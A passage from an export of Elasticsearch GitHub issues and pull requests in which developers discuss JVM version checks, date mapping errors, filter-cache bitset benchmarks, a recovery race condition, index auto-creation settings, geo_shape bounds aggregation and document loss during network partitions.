WARNING: Workaround flag -XX:-UseSuperWord for bug https://bugs.openjdk.java.net/browse/JDK-8024830 found. 
This will result in degraded performance!
Upgrading is preferred, see http://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html for current recommendations.

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar -Des.bypass.vm.check=true org.elasticsearch.bootstrap.JVMCheck

Mar 21, 2015 1:58:52 AM org.elasticsearch.bootstrap.JVMCheck check
WARNING: bypassing jvm version check for version [1.7.0_40], this can result in data corruption!

IBM:

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar org.elasticsearch.bootstrap.JVMCheck

Exception in thread "main" java.lang.RuntimeException: IBM runtimes suffer from several bugs which can cause data corruption.
Please upgrade the JVM, see http://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html for current recommendations.

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar -Des.bypass.vm.check=true org.elasticsearch.bootstrap.JVMCheck

Mar 21, 2015 1:57:16 AM org.elasticsearch.bootstrap.JVMCheck check
WARNING: bypassing jvm version check for version [1.7.0], this can result in data corruption!
</comment><comment author="kimchy" created="2015-03-21T06:43:39Z" id="84266876">LGTM
</comment><comment author="clintongormley" created="2015-04-04T18:12:03Z" id="89632352">w00t!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Not parsing an ISO date when field not inlcuded in _all</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7579</link><project id="" key="" /><description>Given the following mapping:
{
 "root": {
  "properties": {
   "prop1": {"type": "date"},
   "prop2": {
    "properties": {
     "prop3": {"type": "date", "include_in_all": false}
    }
   }
  }
 }
}
The following object:
{
 "prop1": "2014-09-03T16:48:35",
 "prop2": {
  "prop3": "2014-09-02T16:48:35"
 }
}
Throws an error while trying to map prop2.prop3 as it tries to parse it as a long. But if I remove the "include_in_all": false part, it parses it perfectly.

Regards,
Marc
</description><key id="41880449">7579</key><summary>Not parsing an ISO date when field not inlcuded in _all</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">auterium</reporter><labels><label>feedback_needed</label></labels><created>2014-09-03T23:41:51Z</created><updated>2014-10-29T14:15:22Z</updated><resolved>2014-10-29T14:15:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:38:22Z" id="54719837">Hi @auterium 

This works for me on master. What version are you using?

```
DELETE t

PUT /t

PUT /t/_mapping/root/
{
  "properties": {
    "prop1": {
      "type": "date"
    },
    "prop2": {
      "properties": {
        "prop3": {
          "type": "date",
          "include_in_all": false
        }
      }
    }
  }
}

GET _mapping

PUT /t/root/1
{
  "prop1": "2014-09-03T16:48:35",
  "prop2": {
    "prop3": "2014-09-02T16:48:35"
  }
}

GET /_search
{
  "query": {
    "range": {
      "prop2.prop3": {
        "gte": "2014-09-02",
        "lt": "2014-09-03" 
      }
    }
  }
}
```
</comment><comment author="auterium" created="2014-09-06T17:02:29Z" id="54720650">Hi Clinton,

I'm running ES 1.3.0. Strange thing though is that your teste case works for me too. I'll elaborate a more complex one that replicates my issue later through the day and send it for you to test.

Regards,
Marc
</comment><comment author="clintongormley" created="2014-10-29T14:15:22Z" id="60930500">No more info provided, so I'll close this one. Please feel free to reopen if you find a bug.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make .zip and .tar.gz release artifacts contain same files</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7578</link><project id="" key="" /><description>This commit changes the build to include .exe and sigar/.dll files in
both the zip and tar artifacts.

Closes #2793
</description><key id="41878879">7578</key><summary>Make .zip and .tar.gz release artifacts contain same files</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">aleph-zero</reporter><labels><label>:Packaging</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T23:17:03Z</created><updated>2015-06-07T12:07:31Z</updated><resolved>2014-09-08T17:47:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-05T04:17:55Z" id="54583362">LGTM. Should fix labels be 2.0 and 1.4?
</comment><comment author="s1monw" created="2014-09-05T07:21:10Z" id="54592894">I don't think we should fix this for a bugfix release - it's not a bugfix but it's an improvement IMO. Let's get this into 1.4 and master. LGTM 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Change the default cache filter impl from FixedBitSet to WAH8DocIdSet</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7577</link><project id="" key="" /><description>A few months ago, Lucene switched from FixedBitSet to WAH8DocIdSet in order
to cache filters. WAH8DocIdSet is especially better when dealing with sparse
sets: iteration is faster, memory usage is lower and there is an index that
helps keep advance fast.

This doesn't break existing code since #6280 already made sure that there was no
abusive cast from DocIdSet to Bits or FixedBitSet and #7037 moved consumers of
the filter cache that absolutely need to get fixed bitsets to their own cache.

Since cached filters will be more memory-efficient, the filter cache size has
been decreased from 10 to 5%. Although smaller, this might still allow to cache
more filters.
</description><key id="41877214">7577</key><summary>Change the default cache filter impl from FixedBitSet to WAH8DocIdSet</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Core</label><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T22:53:03Z</created><updated>2015-06-07T12:07:44Z</updated><resolved>2014-11-10T09:05:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-03T23:11:25Z" id="54381501">Few things:

(1) This change now means that it uses `DocIdSet#set.isCacheable` to not convert the DocIdSet before caching. I always had a problem with this method to be honest, since it actually means that it won't need the reader in order to get back IndexReader for expensive operations, for for example, today, if the DocIdSet is generated by a filter that access our field data, then its marked as cacheable. 

See for example `GeoDistanceFilter`. Now, this filter generated a DocIdSet that based on the `isCacehable` contract, it should be true. On the other hand, when a user explicitly opts in to cache this filter, they are actually saying, please don't compute the distance each time. With this pull request, this will no longer happens.

We can do 2 things here, either remove the isCacheable check (and check on instanceof for Fixed and WH ones), or, go over all the filters that generate a bit set, and make sure to "hack" the `isCacheable` to make it do what we want.

(2) If we are going to have more WH variants of bitsets, I wonder if we should also optimize the `XBooleanFilter` to make use of it? Since today, if its a FixedBitSet, it will optimize the the boolean operations, can we do this also with WH variant? I am concerned that this will introduce a perf hit in boolean filter. We need to check.

(3) The cache of the filters is reduced, but I wonder how much memory savings will we have in practice to warrant a reduction? For example, `TermsFilter` still uses FixedBitSet, as well as Range filter variants. Which are the most common filters. In a case where the filter returns a FixedBitSst, we use it as is (to not have the cost of recomputing the bit set into WH), but then, we will end up, I suspect, in most cases, with filters where we turn on by default caching, with similar memory usage.
</comment><comment author="kimchy" created="2014-09-03T23:21:51Z" id="54382433">More thoughts on (1), actually, since we allow for field data to be evicted, I would change all the field data based impls to non cacheable, that actually makes sense contact wise (otherwise they still hold a reference). Still need to look at the other impls, for example, `TermFilter` mistakenly returns a DocIdSet that does not override the `isCacheable` method and returns false.
</comment><comment author="jpountz" created="2014-09-03T23:33:41Z" id="54383369">&gt; See for example GeoDistanceFilter. Now, this filter generated a DocIdSet that based on the isCacehable contract, it should be true.

`isCacheable` documentation says `If you have an own &lt;code&gt;DocIdSet&lt;/code&gt; implementation that does its iteration very effective and fast without doing disk I/O, override this method and return &lt;code&gt;true&lt;/code&gt;`. However The doc id set for `GeoDistanceFilter` does neither have fast iteration and potentially performs disk I/O since it's based on field data, so I don't think it is eligible?

&gt;  If we are going to have more WH variants of bitsets, I wonder if we should also optimize the XBooleanFilter to make use of it?

I think FixedBitSet is still better suited here. WAH8 is nice, but it has the limitation that it needs to be built in order so I don't think we can use it here?

&gt; For example, TermsFilter still uses FixedBitSet, as well as Range filter variants. Which are the most common filters. In a case where the filter returns a FixedBitSst, we use it as is (to not have the cost of recomputing the bit set into WH), but then, we will end up, I suspect, in most cases, with filters where we turn on by default caching, with similar memory usage.

Good point. I will revert that part of the change.

&gt; TermFilter mistakenly returns a DocIdSet that does not override the isCacheable method and returns false

I think that behavior is correct since the returned DocIdSet is based on a postings list (it's not in memory).
</comment><comment author="kimchy" created="2014-09-03T23:47:37Z" id="54385691">&gt; isCacheable documentation says If you have an own &lt;code&gt;DocIdSet&lt;/code&gt; implementation that does its iteration very effective and fast without doing disk I/O, override this method and return &lt;code&gt;true&lt;/code&gt;. However The doc id set for GeoDistanceFilter does neither have fast iteration and potentially performs disk I/O since it's based on field data, so I don't think it is eligible?

I read it as fast _without_ doing disk I//O. Also, Field Data is in memory (cost of loading it once, though as I mentioned, it might get evicted, so the referehce will still be there and not properly GC'ed) Regardless, maybe its just semantics, the point I think remains, we need to fix those if we rely on `isCacheable` now.

&gt; I think FixedBitSet is still better suited here. WAH8 is nice, but it has the limitation that it needs to be built in order so I don't think we can use it here?

Yea, but if the inner filters are WH based and not Fixed based, the execution will be slower. And it will now because thats what used for caching (on certain filters). Maybe we can add an optimization (donno if its possible) to do fast boolean operations on an existing FixedBitSet with WH one?

&gt; I think that behavior is correct since the returned DocIdSet is based on a postings list (it's not in memory).

No, look at TermFilter, it overrides DocIdSet, without overriding isCacheable (so it defaults to true) and setting it to false. Thats a bug, no? We didn't see it in ES because we didn't take isCacheable into account.
</comment><comment author="kimchy" created="2014-09-04T00:01:00Z" id="54386710">&gt; No, look at TermFilter, it overrides DocIdSet, without overriding isCacheable (so it defaults to true) and setting it to false. Thats a bug, no? We didn't see it in ES because we didn't take isCacheable into account.

My bad, got confused with the EMPTY implementation, so its good and it defaults to false. Same goes for GeoFilter. I would love (unless you did it already) and go over all the filters we have, and verify that the isCacheable behavior is correct, since now we rely on it.
</comment><comment author="jpountz" created="2014-09-04T00:04:31Z" id="54386981">&gt; I would love (unless you did it already) and go over all the filters we have, and verify that the isCacheable behavior is correct, since now we rely on it.

I was just doing it: everything looks correct in Elasticsearch. However there is one impl in Lucene that doesn't look correct: FieldCacheDocIdSet. I will open an issue. Since we don't use it in Elasticsearch, I don't think that should be a blocker though.
</comment><comment author="jpountz" created="2014-09-04T00:25:27Z" id="54388475">&gt; If we are going to have more WH variants of bitsets, I wonder if we should also optimize the XBooleanFilter to make use of it? Since today, if its a FixedBitSet, it will optimize the the boolean operations, can we do this also with WH variant? I am concerned that this will introduce a perf hit in boolean filter. We need to check.

OK, I just understood how it works: `FixedBitSet.or(DocIdSetIterator)` has some instanceof calls in order to optimize for when the provided iterator is an iterator over a fixed bit set. I didn't know about this optimization. :-)

I'm wondering that if we switch to WAH8DocIdSet it will not be slower in all cases? For example FixedBitSet.or optimization allows to or 64 bits at once, so in the end you need about maxDoc/64 operations in order to compute the union of two sets. But if we take the union with a WAH8DocIdSet instead of a FixedBitSet you will need O(cardinality) operations to compute the union, which is faster on sparse sets? I will try to benchmark the change.
</comment><comment author="rmuir" created="2014-09-04T01:14:02Z" id="54391708">Just another idea about the boolean stuff. I was thinking about this when trying to figure out how to merge query/filter:

We have FixedBitSet.or/and and WAH8.intersect/union. Should we somehow push this up to DocIdSet?  Something simple like:

```
DocIdSet union(DocIDSet...)
DocIdSet intersect(DocIDSet...)
```

I dont know if it makes sense or is a good or bad idea. We should measure if the performance is really better with these optimized methods, versus just intersecting iterators with e.g. ConjunctionScorer. It could be, they are only faster because FixedBitSet has a crappy cost() impl, but WAH8 does not have this issue.

I have a lot of concerns about how useful they really are: how general are they in the presence of other complexities? Or are they only useful for certain trivial cases like BooleanFilter? I kinda don't like the idea of having boolean logic embedded in these impls themselves for that reason. 

But its an idea
</comment><comment author="jpountz" created="2014-09-04T21:58:35Z" id="54551472">I did some very basic benchmarks on an index containing 50M documents in one shard with field values that have various densities.

### Pure iteration

For this test, I measured the response time of the following query on cached filters:

``` json
GET index1/_search?search_type=count
{
  "query": {
    "filtered": {
      "filter": {
        "term": {
          "field": "value"
        }
      }
    }
  }
}
```

| Term freq | WAH8 | FixedBitSet | Not cached |
| --- | --: | --: | --: |
| 99% | 118 | 248 | 397 |
| 90% | 143 | 228 | 375 |
| 10% | 68 | 28 | 47 |
| 1% | 13 | 12 | 12 |
| 1&#8240; | 3 | 5 | 6 |

WAH8 is faster on sparse (&lt; 1%) and dense (&gt;=90%) sets but slower otherwise.

It also confirms that term filters do not benefit much from caching (https://github.com/elasticsearch/elasticsearch/pull/7583).

### bool_filter

This time I tried a `bool_filter` on 3 should clauses that have various frequencies. The query looks like:

``` json
GET index1/_search?search_type=count
{
  "query": {
    "filtered": {
      "filter": {
        "bool": {
          "should": [] // &lt;- 3 clauses on term filters
        }
      }
    }
  }
}
```

| freq1/freq2/freq3 | WAH8 | FixedBitSet |
| --- | --: | --: |
| 90%/10%/1% | 486 | 257 |
| 10%/1%/1&#8240; | 105 | 40 |
| 1%/1&#8240;/0.1&#8240; | 20 | 14 |

Here we can see the impact of the bool filter optimization when frequencies are high.

### Leap frog (ie. advance)

Again 3 clauses, but this time the query is a conjunction and performs some leap-frog:

``` json
GET index1/_search?search_type=count
{
  "query": {
    "filtered": {
      "filter": {
        "and": {
          "filters": [] // &lt;- 3 clauses on term filters
        }
      }
    }
  }
}
```

| freq1/freq2/freq3 | WAH8 | FixedBitSet |
| --- | --: | --: |
| 90%/10%/1% | 40 | 16 |
| 10%/1%/1&#8240; | 11 | 8 |
| 1%/1&#8240;/0.1&#8240; | 5 | 6 |

### Conclusion

Overall these benchmarks mostly agree with http://people.apache.org/~jpountz/doc_id_sets.html that I worked on when I wrote those compact bitsets.

Which one is faster depends on the use-case. FixedBitSet tends to be better on dense sets while WAH8 has interesting memory savings.

Independently of benchmarks, something I like about WAH8 is that it has an accurate cost which would allow to get rid of some heuristics like `if the first document is less than 100`.
</comment><comment author="rmuir" created="2014-09-05T11:52:48Z" id="54615774">&gt; Independently of benchmarks, something I like about WAH8 is that it has an accurate cost which would allow to get rid of some heuristics like if the first document is less than 100.

+1
</comment><comment author="kimchy" created="2014-09-05T12:25:31Z" id="54618335">&gt; Independently of benchmarks, something I like about WAH8 is that it has an accurate cost which would allow to get rid of some heuristics like if the first document is less than 100.

Agreed, but in the most common use case, where one has either BooleanFilter, or terms/range filters, those heuristics will not be possible, since a FixedBitSet is used, even when cached. So I think there is a bigger question here regarding the use of cardinality, or trying to use WH for all one way or another (unclear to me).

@rmuir idea around pushing union/intersect to DocIdSet sounds promising, might be worth exploring in Lucene, even if the "default" impl is just an iteration, it will simplify a lot of code out there, and allow for more optimization to be done down the road without having to go and apply them somehow on different places.

Regarding the benchmarks, I think the main difference that we have with this pull request is that out of the filters that have caching enabled by default, term filter is the only one that will actually use WH compared to FixedBitSet (since terms and range already produce a FixedBitSet), so its not such a big deal potentially.
</comment><comment author="jpountz" created="2014-10-02T09:36:47Z" id="57604996">Lucene recently changed its multi-term query wrapper filter: when the density is high it still uses FixedBitSet but when the density is low it now uses a sparse bit set: https://issues.apache.org/jira/browse/LUCENE-5938

Additionally, I'm hoping that we can get better performance out of RoaringDocIdSet compared to WAH8DocIdSet: https://issues.apache.org/jira/browse/LUCENE-5983

Another idea I have is to use the cost API in order to decide on which impl to use for caching. This way we could still use FixedBitSet in the very dense case and fall back to something that is less brute-force in the sparse case.
</comment><comment author="jpountz" created="2014-11-10T09:05:48Z" id="62357506">This has been fixed by @s1monw (with RoaringDocIdSet instead of WAH8) in 610ce078fb3c84c47d6d32aff7d77ba850e28f9d
</comment><comment author="antonha" created="2014-11-24T16:31:58Z" id="64220720">Hi. 

It seems like I got to see this ticket a tiny bit too late, but I wonder if there is any plans to do a version of this compatible with the 1.x branches? The RoaringDocIdSet seems to be introduced in Lucene 5, which means that we won't see this fix until 2.0.0 is released. For the use case we have, it would help a lot to have an implementation with a lower memory usage. 

I guess this can either be done by using the WAH8 implementation, or by copying the RoaringDocIdSet implementation from Lucene to the ES code base. Is there anything preventing that change?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Fixed race condition in file list</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7576</link><project id="" key="" /><description>The list of files in an active recovery is accessed by multiple threads.
Access was not synchronized, so incorrect file counts and sizes could be
reported. This commit adds synchronization to the affected collections
and primitives.
</description><key id="41873869">7576</key><summary>Resiliency: Fixed race condition in file list</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">aleph-zero</reporter><labels><label>bug</label><label>resiliency</label></labels><created>2014-09-03T22:07:33Z</created><updated>2015-06-07T18:49:17Z</updated><resolved>2014-11-12T10:00:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T20:43:09Z" id="54678877">I can only see this being accessed within synced blocks in `FileChunkTransportRequestHandler` and `BlobStoreIndexShardRepository`. To me this is a simple struct and it should not be concurrently updated at all. As far as I can tell it isn't either so I wonder if we really need that fix. Where do you see the race?
</comment><comment author="aleph-zero" created="2014-09-06T19:18:41Z" id="54725313">This is to address https://github.com/elasticsearch/elasticsearch/issues/6644. Perhaps @bleskes could give a bit more explanation as to where he has seen the race?
</comment><comment author="s1monw" created="2014-09-12T07:44:26Z" id="55371362">I looked  at this again and I now see where the confusion is coming from. `RecoveryState` really has a bad design and we should fix this. Yet, the fix here is only going to remove a symptom of how broken this class is. Some of the methods allow concurrent access ie. `RecovyerState.Index@#addRecoveredByteCount` since it uses atomic integer / long. This is wrong IMO the entire class should only be accessible via a single thread since it's really a struct. IMO the short term fix is to add `synchronized(recoveryState)` everywhere we use this class. Long term this class should synchronize itself and provide methods that guarantee consistent views. I think we should really just allow update by merge ie `RecovyerState.Index#merge(RecovyerState.Index index)` such that you have to construct a new fresh / consistent object and that is passed to the RecoveryState. Makes sense?
</comment><comment author="bleskes" created="2014-09-12T09:29:14Z" id="55380255">+1 . I'm not sure how much work it will be to move to a `#merge` or an `#update` model. Maybe it's worth it to just go for it at one go as opposed to being in a semi happy place where synchronized access is needed.
</comment><comment author="clintongormley" created="2014-11-11T20:20:46Z" id="62614296">@bleskes is this PR still relevant?
</comment><comment author="bleskes" created="2014-11-11T20:28:55Z" id="62615434">@clintongormley I'm not sure whether this PR is the way to continue but the issue ( #6644 ) is still a problem. I would mark the issue as an adopt me and refer here for potential solutions. Shouldn't be too hard to fix.
</comment><comment author="clintongormley" created="2014-11-12T10:00:20Z" id="62694874">Closing this PR but leaving the issue #6644 open
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Setting action.auto_create_index: false in yml file does not stop indexs from being created via POST</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7575</link><project id="" key="" /><description>The documentation says, "Automatic index creation can be disabled by setting action.auto_create_index to false in the config file of all nodes. Automatic mapping creation can be disabled by setting index.mapper.dynamic to false in the config files of all nodes (or on the specific index settings)." I have both of these set yet indexes are still created via POST commands. The setting to stop dynamic mapping updates does work for me.

Confirmation of settings:

$ grep index.mapper elasticsearch.yml
index.mapper.dynamic: false
$ grep action.auto elasticsearch.yml
action.auto_create_index: false

Confirmation that index test doesn&#8217;t exist before POST:

$ curl -XGET 'http://localhost:9200/test/_settings?pretty=true'
{
  "error" : "IndexMissingException[[test] missing]",
  "status" : 404
}

Post command:

$ curl -s -S -XPOST 'http://localhost:9200/test/'
{"acknowledged":true}

Confirmation that index was created:

$ curl -XGET 'http://localhost:9200/test/_settings?pretty=true'
{
  "test" : {
    "settings" : {
      "index" : {
        "uuid" : "aelfeMKTS1qIVqfxUAIukQ",
        "number_of_replicas" : "0",
        "number_of_shards" : "5",
        "version" : {
          "created" : "1010299"
        }
      }
    }
  }
}

Is there something else needed to make this setting work or is this not what it is intended to prevent? If it is not what it is intended to prevent, is there a way to prevent indexes being created via POST commands?
</description><key id="41858859">7575</key><summary>Setting action.auto_create_index: false in yml file does not stop indexs from being created via POST</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Charlie-N</reporter><labels /><created>2014-09-03T19:55:05Z</created><updated>2016-08-27T04:26:30Z</updated><resolved>2014-09-04T10:40:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-04T10:40:00Z" id="54450303">Using `POST /indexname` is a manual request, not an auto-create.  

The only way to prevent indexes being created manually is to make the whole cluster read only: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cluster-update-settings.html#_metadata
</comment><comment author="itplayer" created="2016-08-27T04:26:30Z" id="242895186">Event if I set action.auto_create_index: false in yml, if apply template, index will be auto created. Is this case normal? I use v-1.7.2 and seems AutoCreateIndex.java is totally rewrite in new version.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>geo bounds aggregation: Add support for geo_shape.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7574</link><project id="" key="" /><description>Some time ago I created an enhancement request to support a bounding box aggregation (#5634) as this is very useful for mapping applications to allow a map to zoom to the extent (bounding box) of all matches.  This was implemented in v1.3.0 but unfortunately only for the geo_point type.  
</description><key id="41858815">7574</key><summary>geo bounds aggregation: Add support for geo_shape.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nknize/following{/other_user}', u'events_url': u'https://api.github.com/users/nknize/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nknize/orgs', u'url': u'https://api.github.com/users/nknize', u'gists_url': u'https://api.github.com/users/nknize/gists{/gist_id}', u'html_url': u'https://github.com/nknize', u'subscriptions_url': u'https://api.github.com/users/nknize/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/830187?v=4', u'repos_url': u'https://api.github.com/users/nknize/repos', u'received_events_url': u'https://api.github.com/users/nknize/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nknize/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nknize', u'type': u'User', u'id': 830187, u'followers_url': u'https://api.github.com/users/nknize/followers'}</assignee><reporter username="">yeroc</reporter><labels><label>:Geo</label><label>enhancement</label></labels><created>2014-09-03T19:54:39Z</created><updated>2016-12-14T15:02:09Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:32:26Z" id="54719603">@colings86 what do you think?
</comment><comment author="emmanuelmathot" created="2014-09-09T16:01:47Z" id="54992661">I would find this feature very useful as well. We would generate density maps from those aggregation!
</comment><comment author="yeroc" created="2015-01-14T21:03:19Z" id="69991217">Any update on this?  Does this require some additional features in Lucene or does this require changes to ElasticSearch only?
</comment><comment author="nknize" created="2015-01-15T18:18:24Z" id="70133656">No additional Lucene features required to support this feature.  I'm currently refactoring some legacy `geo_point` code to reuse `geo_shape` logic that fixes polygonal ambiguity issues.  Once that's done adding support for this request will be relatively straight-forward.
</comment><comment author="yeroc" created="2015-01-15T23:03:52Z" id="70179713">@nknize Thanks a lot for the update.
</comment><comment author="emmanuelmathot" created="2015-03-06T17:28:06Z" id="77599009">Great
</comment><comment author="emmanuelmathot" created="2015-03-10T07:35:20Z" id="78007551">Any planned date for release?
</comment><comment author="clintongormley" created="2015-04-04T13:34:44Z" id="89578533">@nknize just assigned this to you so you don't miss it
</comment><comment author="clintongormley" created="2015-11-21T18:21:28Z" id="158669602">@nknize just pinging for an update on this.
</comment><comment author="carlosvega" created="2015-11-27T16:23:31Z" id="160169876">+1
</comment><comment author="nknize" created="2015-11-27T18:52:56Z" id="160189665">2.2 for sure and can be back ported to 2.0+ (@clintongormley thoughts on back porting?).
</comment><comment author="clintongormley" created="2015-11-28T12:11:47Z" id="160288115">@nknize new features/enhancements go into the current stable branch and above only (ie 2.2+ at the moment)
</comment><comment author="samchorlton" created="2016-03-24T19:39:31Z" id="200986404">What is the latest on this?
</comment><comment author="nknize" created="2016-03-24T19:46:39Z" id="200988752">This was put on hold to prioritize spatial indexing performance issues in lucene 6.0. Once we get that stable this will move back up in the list.
</comment><comment author="samchorlton" created="2016-03-24T19:50:48Z" id="200990481">Ok cool thanks for letting me know. Do you know if this will add support to allow aggregation of geoshape polygons or is this just for aggregation of points by polygons?
</comment><comment author="nknize" created="2016-03-24T19:53:54Z" id="200991585">Yes, its to provide `geo_bounds` support for `geo_shape` field types. So `geo_shape` fields will be aggregated into a single bounding box. 
</comment><comment author="yeroc" created="2016-07-18T20:00:56Z" id="233441023">@nknize I see the Lucene 6.1 release notes mention improvements to spatial indexing so assume the work you mention in your previous notes has been completed.  Does this mean this ticket is on deck now or is there still more work to be done prior?  Thanks!
</comment><comment author="oleg1628" created="2016-08-13T10:48:32Z" id="239614989">+1
</comment><comment author="howlowck" created="2016-09-21T19:19:31Z" id="248714686">How are we doing on this feature?
</comment><comment author="aparnavarma92" created="2016-09-28T17:44:13Z" id="250242342">+1 this would be very useful functionality
</comment><comment author="yeroc" created="2016-12-14T15:02:09Z" id="267056138">@nknize Do you have an update on this?</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[docs] fix typo</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7573</link><project id="" key="" /><description /><key id="41854005">7573</key><summary>[docs] fix typo</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels /><created>2014-09-03T19:07:17Z</created><updated>2014-09-04T07:34:43Z</updated><resolved>2014-09-04T07:34:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-04T07:34:43Z" id="54422332">closed by https://github.com/elasticsearch/elasticsearch/commit/7bcd09a134b211330fa33cd4a7b9aa02a08cd613
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Indexing] A network partition can cause in flight documents to be lost</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7572</link><project id="" key="" /><description>This ticket is meant to capture an issue which was discovered as part of the work done in #7493 , which contains a [failing reproduction test](https://github.com/elasticsearch/elasticsearch/blob/596a4a073584c4262d574828c9caea35b5ed1de5/src/test/java/org/elasticsearch/discovery/DiscoveryWithServiceDisruptions.java#L375) with @awaitFix.

If a network partition separates a node from the master, there is some window of time before the node detects it. The length of the window is dependent on the type of the partition. This window is extremely small if a socket is broken. More adversarial partitions, for example, silently dropping requests without breaking the socket can take longer (up to 3x30s using current defaults).

If the node hosts a _primary_ shard at the moment of partition, and ends up being isolated from the cluster (which could have resulted in Split Brain before), some documents that are being indexed into the primary _may_ be lost if they fail to reach one of the allocated replicas  (due to the partition) and that replica is later promoted to primary by the master.
